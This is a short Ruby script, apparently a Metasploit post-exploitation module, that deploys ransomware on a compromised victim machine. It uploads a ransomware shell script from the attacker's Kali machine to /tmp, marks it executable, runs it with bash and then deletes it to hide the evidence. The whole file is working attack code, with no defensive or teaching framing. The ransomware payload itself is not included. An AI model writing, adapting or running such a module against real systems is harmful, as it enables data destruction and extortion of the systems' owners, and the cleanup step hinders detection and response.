#def run_script(client)
# Define the paths for the ransomware script on both attacker and victim machines
local_ransomware_script = "/home/kali/Documents/ransomware.sh"  # Local path on attacker machine
remote_ransomware_script = "/tmp/ransomware.sh"                # Remote path on victim machine

# Step 1: Upload the ransomware script to the victim machine
print_status("Uploading ransomware script to the victim machine...")
if File.exist?(local_ransomware_script)
  session.fs.file.upload_file(remote_ransomware_script, local_ransomware_script)
  print_good("Ransomware script uploaded successfully.")
else
  print_error("Ransomware script does not exist on the attacker machine.")
  return
end

# Step 2: Set the uploaded script as executable
print_status("Setting execute permissions for the uploaded script...")
cmd_exec("chmod +x #{remote_ransomware_script}")

# Step 3: Execute the ransomware script on the victim machine
print_status("Executing the ransomware script on the victim machine...")
cmd_exec("bash #{remote_ransomware_script}")

# Step 4: Clean up by removing the uploaded script from the victim machine
print_status("Cleaning up uploaded files...")
cmd_exec("rm -f #{remote_ransomware_script}")
print_good("Ransomware script executed and cleaned up.")
#end
